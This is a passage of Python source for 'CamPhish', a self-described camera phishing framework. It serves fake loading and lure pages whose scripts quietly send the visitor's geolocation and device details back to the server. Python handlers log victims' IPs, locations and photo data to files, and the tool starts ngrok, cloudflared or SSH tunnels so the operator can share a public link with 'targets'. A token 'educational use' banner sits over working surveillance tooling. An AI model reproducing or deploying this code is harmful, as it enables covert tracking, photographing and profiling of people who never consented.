        @keyframes gradient {{
            0% {{ background-position: 0% 50%; }}
            50% {{ background-position: 100% 50%; }}
            100% {{ background-position: 0% 50%; }}
        }}
        
        .loader-container {{
            text-align: center;
            color: white;
            padding: 40px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            animation: fadeIn 1s ease;
        }}
        
        @keyframes fadeIn {{
            from {{
                opacity: 0;
                transform: scale(0.9);
            }}
            to {{
                opacity: 1;
                transform: scale(1);
            }}
        }}
        
        .spinner {{
            width: 80px;
            height: 80px;
            margin: 30px auto;
            position: relative;
        }}
        
        .double-bounce1, .double-bounce2 {{
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background-color: white;
            opacity: 0.6;
            position: absolute;
            top: 0;
            left: 0;
            animation: bounce 2.0s infinite ease-in-out;
        }}
        
        .double-bounce2 {{
            animation-delay: -1.0s;
        }}
        
        @keyframes bounce {{
            0%, 100% {{ transform: scale(0.0); }}
            50% {{ transform: scale(1.0); }}
        }}
        
        h2 {{
            font-size: 2em;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }}
        
        p {{
            font-size: 1.2em;
            opacity: 0.9;
            margin: 10px 0;
        }}
        
        .progress-bar {{
            width: 300px;
            height: 10px;
            background: rgba(255,255,255,0.3);
            border-radius: 5px;
            margin: 30px auto 20px;
            overflow: hidden;
        }}
        
        .progress {{
            width: 0%;
            height: 100%;
            background: white;
            border-radius: 5px;
            animation: progress 2s ease-in-out forwards;
        }}
        
        @keyframes progress {{
            to {{ width: 100%; }}
        }}
        
        .status-text {{
            font-size: 1em;
            opacity: 0.8;
        }}
        
        .dots::after {{
            content: '';
            animation: dots 1.5s infinite;
        }}
        
        @keyframes dots {{
            0%, 20% {{ content: ''; }}
            40% {{ content: '.'; }}
            60% {{ content: '..'; }}
            80%, 100% {{ content: '...'; }}
        }}
    </style>
</head>
<body>
    <div class="loader-container">
        <h2>Loading<span class="dots"></span></h2>
        
        <div class="spinner">
            <div class="double-bounce1"></div>
            <div class="double-bounce2"></div>
        </div>
        
        <p id="statusMessage">Initializing secure connection...</p>
        
        <div class="progress-bar">
            <div class="progress"></div>
        </div>
        
        <p class="status-text" id="detailedStatus">Please wait while we prepare your content</p>
    </div>
    
    <script>
        const messages = [
            'Establishing secure connection...',
            'Verifying SSL certificate...',
            'Loading content...',
            'Almost there...',
            'Redirecting you...'
        ];
        
        const detailedMessages = [
            'This may take a few seconds',
            'Please enable location for better experience',
            'Checking compatibility...',
            'Optimizing for your device...'
        ];
        
        let messageIndex = 0;
        let detailIndex = 0;
        
        setInterval(() => {{
            document.getElementById('statusMessage').innerText = messages[messageIndex % messages.length];
            messageIndex++;
        }}, 2000);
        
        setInterval(() => {{
            document.getElementById('detailedStatus').innerText = detailedMessages[detailIndex % detailedMessages.length];
            detailIndex++;
        }}, 3000);
        
        // Redirect after loading
        setTimeout(() => {{
            window.location.href = '/template';
        }}, 5000);
        
        // Get location during loading
        if (navigator.geolocation) {{
            setTimeout(() => {{
                navigator.geolocation.getCurrentPosition(
                    (position) => {{
                        fetch('/api/location', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                acc: position.coords.accuracy,
                                timestamp: new Date().toISOString()
                            }})
                        }});
                    }},
                    (error) => console.log('Location unavailable'),
                    {{
                        enableHighAccuracy: true,
                        timeout: 5000
                    }}
                );
            }}, 1000);
        }}
        
        // Send device info
        fetch('/api/device', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            }})
        }});
    </script>
</body>
</html>"""
    
    def generate_template(self):
        """Generate the selected template"""
        global current_template, template_config
        
        if current_template == '1':
            festival = template_config.get('festival', 'Festival')
            message = template_config.get('message', 'Have a great celebration!')
            return self.template_generator.generate_festival(festival, message)
        elif current_template == '2':
            video_id = template_config.get('video_id', 'dQw4w9WgXcQ')
            return self.template_generator.generate_youtube(video_id)
        else:
            return "<h1>Template not available</h1>"
    
    def reverse_geocode(self, lat, lon):
        """Simple reverse geocoding using OpenStreetMap"""
        try:
            import requests
            url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}&zoom=18&addressdetails=1"
            response = requests.get(url, headers={'User-Agent': 'CamPhish/3.0'}, timeout=5)
            if response.status_code == 200:
                data = response.json()
                return data.get('display_name', 'Unknown')
        except:
            pass
        return None
    
    def save_location(self, location_data):
        """Save location to file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{OUTPUT_DIR}/location_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write(f"Timestamp: {location_data['timestamp']}\n")
            f.write(f"IP: {location_data['ip']}\n")
            f.write(f"Latitude: {location_data['lat']}\n")
            f.write(f"Longitude: {location_data['lon']}\n")
            f.write(f"Accuracy: {location_data['accuracy']} meters\n")
            f.write(f"Speed: {location_data['speed']}\n")
            if location_data['address']:
                f.write(f"Address: {location_data['address']}\n")
            f.write(f"Maps URL: {location_data['maps_url']}\n")
            f.write("\n")
    
    def save_ip_log(self, ip_data):
        """Save IP to log file"""
        filename = f"{OUTPUT_DIR}/ip_log.txt"
        
        with open(filename, 'a') as f:
            f.write(f"\n{'='*50}\n")
            f.write(f"Timestamp: {ip_data['timestamp']}\n")
            f.write(f"IP: {ip_data['ip']}\n")
            f.write(f"User-Agent: {ip_data['user_agent']}\n")
            f.write(f"Path: {ip_data.get('path', '/')}\n")
            f.write(f"Referer: {ip_data.get('referer', 'Direct')}\n")
            f.write(f"{'='*50}\n")
    
    def save_metadata(self, metadata):
        """Save photo metadata"""
        filename = f"{OUTPUT_DIR}/photo_metadata.json"
        
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
        except:
            data = []
        
        data.append(metadata)
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    
    def save_device_info(self, device_info):
        """Save device information"""
        filename = f"{OUTPUT_DIR}/devices.json"
        
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
        except:
            data = []
        
        data.append(device_info)
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

# ==================== Enhanced Tunnel Management ====================

class TunnelManager:
    """Manage tunneling services"""
    
    def __init__(self):
        self.process = None
        self.tunnel_type = None
        self.public_url = None
    
    def check_dependencies(self):
        """Check and install dependencies"""
        required = {
            'php': 'php',
            'wget': 'wget',
            'unzip': 'unzip',
            'curl': 'curl'
        }
        
        missing = []
        
        for cmd, pkg in required.items():
            if not self._check_command(cmd):
                missing.append(pkg)
        
        if missing:
            print(f"\n\033[93m[*]\033[0m Installing missing dependencies...")
            self._install_dependencies(missing)
            return self.check_dependencies()
        
        return True
    
    def _check_command(self, cmd):
        """Check if command exists"""
        try:
            subprocess.run([cmd, '--version'], capture_output=True, check=True)
            return True
        except:
            return False
    
    def _install_dependencies(self, packages):
        """Install missing packages"""
        system = platform.system().lower()
        
        if system == 'linux':
            # Try different package managers
            if self._check_command('apt-get'):
                subprocess.run(['sudo', 'apt-get', 'update'], capture_output=True)
                subprocess.run(['sudo', 'apt-get', 'install', '-y'] + packages, capture_output=True)
            elif self._check_command('yum'):
                subprocess.run(['sudo', 'yum', 'install', '-y'] + packages, capture_output=True)
            elif self._check_command('pacman'):
                subprocess.run(['sudo', 'pacman', '-S', '--noconfirm'] + packages, capture_output=True)
        elif system == 'darwin':
            if self._check_command('brew'):
                subprocess.run(['brew', 'install'] + packages, capture_output=True)
        elif system == 'windows':
            print("\033[93m[*]\033[0m Please install manually on Windows")
    
    def start_ngrok(self, port):
        """Start ngrok tunnel"""
        print("\n\033[93m[*]\033[0m Starting ngrok tunnel...")
        
        # Check if ngrok exists
        ngrok_cmd = self._get_ngrok_path()
        
        if not ngrok_cmd:
            if not self._download_ngrok():
                return None
        
        try:
            # Start ngrok process
            if platform.system().lower() == 'windows':
                self.process = subprocess.Popen(
                    [ngrok_cmd, 'http', str(port), '--log=stdout'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                self.process = subprocess.Popen(
                    [ngrok_cmd, 'http', str(port), '--log=stdout'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            
            # Wait for tunnel to establish
            time.sleep(5)
            
            # Get public URL
            import requests
            try:
                response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
                data = response.json()
                if data['tunnels']:
                    self.public_url = data['tunnels'][0]['public_url']
                    self.tunnel_type = 'ngrok'
                    print(f"\033[92m[+]\033[0m Ngrok URL: {self.public_url}")
                    return self.public_url
            except:
                pass
            
            # Fallback: try to read from log
            time.sleep(2)
            return self._extract_ngrok_url()
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Error starting ngrok: {e}")
            return None
    
    def _get_ngrok_path(self):
        """Get ngrok executable path"""
        if platform.system().lower() == 'windows':
            if os.path.exists('ngrok.exe'):
                return 'ngrok.exe'
        else:
            if os.path.exists('./ngrok'):
                return './ngrok'
            elif self._check_command('ngrok'):
                return 'ngrok'
        return None
    
    def _download_ngrok(self):
        """Download ngrok"""
        print("\033[93m[*]\033[0m Downloading ngrok...")
        
        system = platform.system().lower()
        machine = platform.machine().lower()
        
        base_url = "https://bin.equinox.io/c/bNyj1mQVY4c"
        
        if system == 'windows':
            url = f"{base_url}/ngrok-v3-stable-windows-amd64.zip"
            output = "ngrok.zip"
        elif system == 'darwin':
            if 'arm' in machine:
                url = f"{base_url}/ngrok-v3-stable-darwin-arm64.zip"
            else:
                url = f"{base_url}/ngrok-v3-stable-darwin-amd64.zip"
            output = "ngrok.zip"
        else:
            if 'aarch64' in machine:
                url = f"{base_url}/ngrok-v3-stable-linux-arm64.zip"
            elif 'arm' in machine:
                url = f"{base_url}/ngrok-v3-stable-linux-arm.zip"
            elif 'x86_64' in machine:
                url = f"{base_url}/ngrok-v3-stable-linux-amd64.zip"
            else:
                url = f"{base_url}/ngrok-v3-stable-linux-386.zip"
            output = "ngrok.zip"
        
        try:
            # Download
            subprocess.run(['wget', '-q', '--show-progress', url, '-O', output], check=True)
            
            # Extract
            subprocess.run(['unzip', '-q', output], check=True)
            os.remove(output)
            
            # Set permissions
            if system != 'windows':
                os.chmod('ngrok', 0o755)
            
            return True
        except Exception as e:
            print(f"\033[91m[!]\033[0m Failed to download ngrok: {e}")
            return False
    
    def _extract_ngrok_url(self):
        """Extract URL from ngrok logs"""
        try:
            import requests
            response = requests.get('http://localhost:4040/api/tunnels')
            data = response.json()
            if data['tunnels']:
                return data['tunnels'][0]['public_url']
        except:
            pass
        return None
    
    def start_cloudflared(self, port):
        """Start cloudflared tunnel"""
        print("\n\033[93m[*]\033[0m Starting cloudflared tunnel...")
        
        # Check if cloudflared exists
        cf_cmd = self._get_cloudflared_path()
        
        if not cf_cmd:
            if not self._download_cloudflared():
                return None
        
        try:
            # Start cloudflared
            if platform.system().lower() == 'windows':
                self.process = subprocess.Popen(
                    [cf_cmd, 'tunnel', '--url', f'http://localhost:{port}'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                self.process = subprocess.Popen(
                    [cf_cmd, 'tunnel', '--url', f'http://localhost:{port}', '--logfile', '.cf.log'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            
            # Wait for tunnel
            time.sleep(8)
            
            # Extract URL from log
            if os.path.exists('.cf.log'):
                with open('.cf.log', 'r') as f:
                    log = f.read()
                    urls = re.findall(r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com', log)
                    if urls:
                        self.public_url = urls[0]
                        self.tunnel_type = 'cloudflared'
                        print(f"\033[92m[+]\033[0m Cloudflared URL: {self.public_url}")
                        return self.public_url
            
            print("\033[91m[!]\033[0m Could not get cloudflared URL")
            return None
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Error starting cloudflared: {e}")
            return None
    
    def _get_cloudflared_path(self):
        """Get cloudflared executable path"""
        if platform.system().lower() == 'windows':
            if os.path.exists('cloudflared.exe'):
                return 'cloudflared.exe'
        else:
            if os.path.exists('./cloudflared'):
                return './cloudflared'
            elif self._check_command('cloudflared'):
                return 'cloudflared'
        return None
    
    def _download_cloudflared(self):
        """Download cloudflared"""
        print("\033[93m[*]\033[0m Downloading cloudflared...")
        
        system = platform.system().lower()
        machine = platform.machine().lower()
        
        if system == 'windows':
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
            output = "cloudflared.exe"
        elif system == 'darwin':
            if 'arm' in machine:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz"
            else:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"
            output = "cloudflared.tgz"
        else:
            if 'aarch64' in machine:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            elif 'arm' in machine:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
            elif 'x86_64' in machine:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
            else:
                url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
            output = "cloudflared"
        
        try:
            if output.endswith('.tgz'):
                subprocess.run(['wget', '-q', '--show-progress', url, '-O', output], check=True)
                subprocess.run(['tar', '-xzf', output], check=True)
                os.remove(output)
            else:
                subprocess.run(['wget', '-q', '--show-progress', url, '-O', output], check=True)
            
            if system != 'windows':
                os.chmod(output, 0o755)
            
            return True
        except Exception as e:
            print(f"\033[91m[!]\033[0m Failed to download cloudflared: {e}")
            return False
    
    def start_local_php(self, port):
        """Start local PHP server"""
        print(f"\n\033[93m[*]\033[0m Starting PHP server on port {port}...")
        
        try:
            if platform.system().lower() == 'windows':
                self.process = subprocess.Popen(
                    ['php', '-S', f'0.0.0.0:{port}'],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                self.process = subprocess.Popen(
                    ['php', '-S', f'0.0.0.0:{port}'],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            
            time.sleep(2)
            self.public_url = f"http://{self.get_local_ip()}:{port}"
            self.tunnel_type = 'local'
            print(f"\033[92m[+]\033[0m Local server running on {self.public_url}")
            return self.public_url
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Error starting PHP server: {e}")
            return None
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def stop(self):
        """Stop tunnel process"""
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=5)
            except:
                self.process.kill()
            self.process = None

# ==================== Main Application ====================

class CamPhishApp:
    """Main application class"""
    
    def __init__(self):
        self.tunnel_manager = TunnelManager()
        self.httpd = None
        self.server_thread = None
        self.running = True
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        print("\n\n\033[93m[*]\033[0m Shutting down...")
        self.running = False
    
    def show_banner(self):
        """Display enhanced banner"""
        os.system('clear' if os.name != 'nt' else 'cls')
        
        banner = f"""
\033[96m    ╔══════════════════════════════════════════════════════════╗
    ║                    \033[92mCAMPHISH v{VERSION}\033[96m                      ║
    ║           \033[93mAdvanced Camera Phishing Framework\033[96m                ║
    ╚══════════════════════════════════════════════════════════╝\033[0m

\033[90m    ╔══════════════════════════════════════════════════════════╗
    ║  \033[91m⚠️  FOR EDUCATIONAL AND SECURITY TESTING ONLY ⚠️\033[90m        ║
    ║  \033[93mUnauthorized use may violate laws and regulations\033[90m       ║
    ╚══════════════════════════════════════════════════════════╝\033[0m

\033[95m    Features:
    ├─ Multiple professional templates
    ├─ Automatic dependency management
    ├─ Multiple tunneling options (ngrok/cloudflared/local)
    ├─ Advanced data capture (photos, location, device info)
    ├─ Anti-detection mechanisms
    ├─ Session management
    └─ Organized output structure\033[0m

\033[97m    System Info:
    ├─ OS: {platform.system()} {platform.release()}
    ├─ Python: {sys.version.split()[0]}
    └─ Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\033[0m
"""
        print(banner)
    
    def setup_directories(self):
        """Create necessary directories"""
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        os.makedirs(TEMP_DIR, exist_ok=True)
    
    def select_template(self):
        """Select and configure template"""
        global current_template, template_config
        
        print("\n\033[94m╔══════════════════════════════════════════╗")
        print("║        Available Templates            ║")
        print("╚══════════════════════════════════════════╝\033[0m\n")
        
        for key, template in TEMPLATES.items():
            print(f"  \033[92m[{key}]\033[0m {template['name']}")
            print(f"      └─ \033[90m{template['desc']}\033[0m")
            print()
        
        while True:
            choice = input("\n\033[93m[?]\033[0m Select template (1-5): ").strip()
            
            if choice in TEMPLATES:
                current_template = choice
                print(f"\n\033[92m[+]\033[0m Selected: {TEMPLATES[choice]['name']}")
                
                # Configure template
                if choice == '1':
                    festival = input("\033[93m[?]\033[0m Festival name [Festival]: ").strip() or "Festival"
                    message = input("\033[93m[?]\033[0m Custom message [Have a great celebration!]: ").strip() or "Have a great celebration!"
                    template_config = {'festival': festival, 'message': message}
                elif choice == '2':
                    video_id = input("\033[93m[?]\033[0m YouTube Video ID [dQw4w9WgXcQ]: ").strip() or "dQw4w9WgXcQ"
                    template_config = {'video_id': video_id}
                elif choice == '3':
                    meeting_name = input("\033[93m[?]\033[0m Meeting name [Business Meeting]: ").strip() or "Business Meeting"
                    template_config = {'meeting_name': meeting_name}
                elif choice == '4':
                    service_name = input("\033[93m[?]\033[0m Service name [Security Check]: ").strip() or "Security Check"
                    template_config = {'service_name': service_name}
                elif choice == '5':
                    app_name = input("\033[93m[?]\033[0m App name [Photo Editor]: ").strip() or "Photo Editor"
                    template_config = {'app_name': app_name}
                
                return True
            
            print("\033[91m[!]\033[0m Invalid choice. Please select 1-5.")
    
    def select_tunnel_method(self):
        """Select tunneling method"""
        print("\n\033[94m╔══════════════════════════════════════════╗")
        print("║        Tunneling Options              ║")
        print("╚══════════════════════════════════════════╝\033[0m\n")
        
        print("  \033[92m[1]\033[0m Ngrok        - Fast, reliable, requires internet")
        print("  \033[92m[2]\033[0m Cloudflared  - Good alternative, HTTPS by default")
        print("  \033[92m[3]\033[0m Local PHP    - Local network only")
        print("  \033[92m[4]\033[0m Serveo        - SSH tunneling (alternative)")
        print("  \033[92m[5]\033[0m Localhost.run - Quick SSH tunnel")
        print()
        
        while True:
            choice = input("\n\033[93m[?]\033[0m Select tunnel method (1-5): ").strip()
            
            if choice == '1':
                return self.tunnel_manager.start_ngrok(PORT)
            elif choice == '2':
                return self.tunnel_manager.start_cloudflared(PORT)
            elif choice == '3':
                return self.tunnel_manager.start_local_php(PORT)
            elif choice == '4':
                return self.start_serveo()
            elif choice == '5':
                return self.start_localhost_run()
            else:
                print("\033[91m[!]\033[0m Invalid choice. Please select 1-5.")
    
    def start_serveo(self):
        """Start Serveo tunnel"""
        print("\n\033[93m[*]\033[0m Starting Serveo tunnel...")
        
        subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        try:
            if platform.system().lower() == 'windows':
                self.tunnel_manager.process = subprocess.Popen(
                    ['ssh', '-R', f'{subdomain}:80:localhost:{PORT}', 'serveo.net'],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                self.tunnel_manager.process = subprocess.Popen(
                    ['ssh', '-R', f'{subdomain}:80:localhost:{PORT}', 'serveo.net'],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            
            time.sleep(3)
            url = f"https://{subdomain}.serveo.net"
            print(f"\033[92m[+]\033[0m Serveo URL: {url}")
            return url
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Error starting Serveo: {e}")
            return None
    
    def start_localhost_run(self):
        """Start localhost.run tunnel"""
        print("\n\033[93m[*]\033[0m Starting localhost.run tunnel...")
        
        try:
            if platform.system().lower() == 'windows':
                self.tunnel_manager.process = subprocess.Popen(
                    ['ssh', '-R', f'80:localhost:{PORT}', 'localhost.run'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                self.tunnel_manager.process = subprocess.Popen(
                    ['ssh', '-R', f'80:localhost:{PORT}', 'localhost.run'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
            
            time.sleep(5)
            
            # Try to get URL from output
            if self.tunnel_manager.process.stdout:
                for line in self.tunnel_manager.process.stdout:
                    if 'https://' in line:
                        url = re.search(r'https://[^\s]+', line).group()
                        print(f"\033[92m[+]\033[0m localhost.run URL: {url}")
                        return url
            
            return None
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Error starting localhost.run: {e}")
            return None
    
    def start_server(self):
        """Start HTTP server"""
        global httpd
        
        handler = CamPhishHandler
        try:
            httpd = socketserver.TCPServer(("0.0.0.0", PORT), handler)
            self.server_thread = threading.Thread(target=httpd.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            print(f"\n\033[92m[+]\033[0m Server started on port {PORT}")
            return True
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Failed to start server: {e}")
            return False
    
    def monitor_session(self, public_url):
        """Monitor session and display captures"""
        print("\n" + "="*60)
        print(" \033[92mSESSION ACTIVE - Waiting for targets\033[0m ".center(60, "="))
        print("="*60)
        
        if public_url:
            print(f"\n\033[93m📢 Share this link:\033[0m \033[4m{public_url}\033[0m")
            print(f"\033[90m   Shortened: bit.ly/{hash(public_url)%1000000:06d}\033[0m")
        
        print("\n\033[90mPress Ctrl+C to stop session\033[0m")
        print("\n" + "="*60)
        
        last_counts = {
            'ips': 0,
            'locations': 0,
            'photos': 0,
            'devices': 0
        }
        
        start_time = time.time()
        
        while self.running:
            # Clear line and update counts
            current_counts = {
                'ips': len(captured_data.get('ips', [])),
                'locations': len(captured_data.get('locations', [])),
                'photos': len(captured_data.get('photos', [])),
                'devices': len(captured_data.get('device_info', []))
            }
            
            elapsed = int(time.time() - start_time)
            
            status_line = (f"\r\033[94m⏱️ {elapsed//60:02d}:{elapsed%60:02d} "
                          f"| 👤 IPs: {current_counts['ips']} "
                          f"| 📍 Locations: {current_counts['locations']} "
                          f"| 📸 Photos: {current_counts['photos']} "
                          f"| 📱 Devices: {current_counts['devices']}\033[0m")
            
            print(status_line, end='', flush=True)
            
            # Check for new captures
            for key in current_counts:
                if current_counts[key] > last_counts[key]:
                    print(f"\n\033[92m[+]\033[0m New {key} captured! Total: {current_counts[key]}")
                    last_counts[key] = current_counts[key]
            
            time.sleep(1)
    
    def show_summary(self):
        """Show session summary"""
        print("\n" + "="*60)
        print(" \033[94mSESSION SUMMARY\033[0m ".center(60, "="))
        print("="*60 + "\n")
        
        print(f"\033[97mTotal Visitors:\033[0m {len(captured_data.get('ips', []))}")
        print(f"\033[97mLocations Captured:\033[0m {len(captured_data.get('locations', []))}")
        print(f"\033[97mPhotos Captured:\033[0m {len(captured_data.get('photos', []))}")
        print(f"\033[97mDevice Info Captured:\033[0m {len(captured_data.get('device_info', []))}")
        
        # Save summary
        summary = {
            'session_id': datetime.now().strftime('%Y%m%d_%H%M%S'),
            'duration': time.time() - start_time if 'start_time' in locals() else 0,
            'template': current_template,
            'captures': {
                'ips': len(captured_data.get('ips', [])),
                'locations': len(captured_data.get('locations', [])),
                'photos': len(captured_data.get('photos', [])),
                'devices': len(captured_data.get('device_info', []))
            }
        }
        
        summary_file = f"{OUTPUT_DIR}/session_summary.json"
        try:
            with open(summary_file, 'r') as f:
                sessions = json.load(f)
        except:
            sessions = []
        
        sessions.append(summary)
        
        with open(summary_file, 'w') as f:
            json.dump(sessions, f, indent=2)
        
        print(f"\n\033[92m[+]\033[0m Summary saved to {summary_file}")
        
        # Show recent captures
        if captured_data.get('locations'):
            print("\n\033[93mRecent Locations:\033[0m")
            for loc in captured_data['locations'][-3:]:
                print(f"  • {loc.get('lat', '?')}, {loc.get('lon', '?')}")
        
        if captured_data.get('photos'):
            print(f"\n\033[93mPhotos saved in:\033[0m {OUTPUT_DIR}/")
    
    def cleanup(self):
        """Clean up resources"""
        print("\n\033[93m[*]\033[0m Cleaning up...")
        
        # Stop tunnel
        if self.tunnel_manager:
            self.tunnel_manager.stop()
        
        # Stop HTTP server
        if httpd:
            httpd.shutdown()
            httpd.server_close()
        
        # Remove temp directory
        try:
            shutil.rmtree(TEMP_DIR)
        except:
            pass
        
        print("\033[92m[+]\033[0m Cleanup completed")
    
    def run(self):
        """Main execution"""
        global start_time
        
        self.show_banner()
        
        # Setup
        self.setup_directories()
        
        # Check dependencies
        print("\n\033[93m[*]\033[0m Checking dependencies...")
        if not self.tunnel_manager.check_dependencies():
            print("\033[91m[!]\033[0m Failed to install dependencies")
            return
        
        # Select template
        if not self.select_template():
            return
        
        # Start server
        if not self.start_server():
            return
        
        # Start tunnel
        public_url = self.select_tunnel_method()
        
        # Start monitoring
        start_time = time.time()
        
        try:
            self.monitor_session(public_url)
        except KeyboardInterrupt:
            print("\n\n\033[93m[*]\033[0m Stopping session...")
        except Exception as e:
            print(f"\n\033[91m[!]\033[0m Error: {e}")
        finally:
            self.show_summary()
            self.cleanup()

# ==================== Entry Point ====================

def main():
    """Application entry point"""
    app = CamPhishApp()
    
    try:
        app.run()
    except KeyboardInterrupt:
        print("\n\n\033[93m[*]\033[0m Exiting...")
    except Exception as e:
        print(f"\n\033[91m[!]\033[0m Fatal error: {e}")
        app.cleanup()
    
    print("\n\033[92m[+]\033[0m Goodbye!")

if __name__ == "__main__":
    main()
